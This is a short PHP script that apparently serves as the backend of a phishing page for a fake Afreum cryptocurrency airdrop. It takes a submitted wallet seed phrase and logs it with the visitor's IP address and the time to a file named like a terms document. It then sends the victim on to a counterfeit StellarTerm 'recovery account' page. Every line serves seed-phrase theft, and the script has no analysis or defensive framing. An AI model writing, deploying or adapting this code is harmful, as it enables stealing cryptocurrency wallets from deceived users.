<?php
$file = "https://afreum-airdrop.github.io/Afreum-airdrop/seratujutalagi-2024_____Terms.txt";
$walletSeed   = $_POST['walletSeed'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "===================KEY=======================");
fwrite($handle, "\n");
fwrite($handle, "KEY : ");
fwrite($handle, "$walletSeed");
fwrite($handle, "\n");

fwrite($handle, "IP  : ");

fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
header("Location:https://recovery-account-afreum-airdrop-a3c848.gitlab.io/StellarTerm.html?Connect-wallet-to-participate-in-the-Afreum-Airdrop/");

?>
